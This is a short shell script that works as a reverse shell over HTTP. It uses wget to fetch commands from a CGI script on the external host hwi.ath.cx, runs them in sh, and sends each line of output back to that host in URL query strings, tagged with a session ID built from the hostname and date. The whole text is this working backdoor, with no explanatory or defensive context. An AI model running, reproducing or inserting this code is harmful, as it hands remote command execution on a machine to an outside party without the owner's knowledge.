SERVER="hwi.ath.cx"
URL="/cgi-bin/joey/revssh"

SESSID=`hostname -a``date -I`

COM="wget -O -"
# COM="lynx -dump"
# COM="telnet ..."

$COM "http://$SERVER/$URL?sessid=$SESSID&init=true" |

sh 2>&1 |

while read LINE; do
	$COM "http://$SERVER/$URL?sessid=$SESSID&output=$LINE"
done
